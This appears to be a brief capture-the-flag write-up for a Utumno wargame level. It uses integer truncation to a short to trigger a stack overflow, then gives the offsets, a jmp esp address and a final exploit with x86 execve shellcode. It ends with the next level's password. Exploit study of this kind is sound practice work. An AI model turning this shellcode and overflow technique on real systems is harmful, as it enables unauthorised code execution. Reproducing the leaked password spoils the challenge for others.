Integer underflow maybe ?

just pass `0xffffffffff0001` which is `72057594037862401` in decimal

```c
#include <stdio.h>

int main() {
    size_t a = 0xffffffffff0001;
    short c = a;

    printf("%hd\n", c);
    printf("%ld\n", a);
}
```

overflow size: 65537
eip at 65286
esp at 65290

jmp esp: 0xf7fc4f97

final exploit:
run 65537 $(python -c "print 'A' * 65286 + '\x97\x4f\xfc\xf7' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'")

utumno5:woucaejiek
